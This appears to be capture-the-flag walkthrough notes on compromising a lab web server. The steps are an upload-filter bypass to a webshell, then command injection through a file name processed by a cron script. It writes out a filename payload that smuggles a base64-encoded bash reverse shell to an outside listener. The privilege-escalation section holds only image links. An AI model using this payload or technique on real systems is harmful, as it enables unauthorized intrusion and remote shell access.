started with nmap, saw 80 so immediately checked it out
no domain redirect, so immediately going for dirsearch
im able to download a backup.tar from /backup
and theres also /uploads and upload.php endpoints, i check upload.php and it is indeed a page with file upload mechnism, i attempt to upload a normal jpeg but it fails, so i check out the backup.tar
its a backup of all the source code, using the source code im able to bypass the restrictions, and upload a webshell
with the webshell i escalate to revshell, gaining foothold as 'apache'
i check the home folder, find a user called guly, in guly's dir i find a script that runs every minute, and i have reading permissions.
by reading the script im supposed to understand that the functionality is scanning the uploads directory for malicious files, and removing them immediately.
the uploads directory is actually world writeable, and by inspecting the script closely, a command injection vuln appears.
![[Pasted image 20250915211441.png]]
the exec function, is made up of the $value parameter, but this $value is actually the file name, which is entirely controlled by us
the trick here is to use base64 encoding in order to escalate the command injection to a revshell as guly, since the command injection depends on the filename and a filename is a very limiting variable (cant use / and other chars)
the payload we can use : 
`echo asd > "a;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOC8xMjM1IDA+JjEK' | base64 -d | bash;b.jpg"` 
since the contents of the file dont matter, we use "asd"
the "a" is just a placeholder for the "rm" call, and a ";" is used to seperate our payload from the already running command
then we add a revshell command encoded in base64, which we echo, to move the output to a base64 -d (to decode) and lastly, move the decoded output into bash, for execution
this gives us a revshell as guly in our listener.

Privesc:
![[Pasted image 20250915212434.png]]

  ![[Pasted image 20250915212521.png]]![[Pasted image 20250915212451.png]]
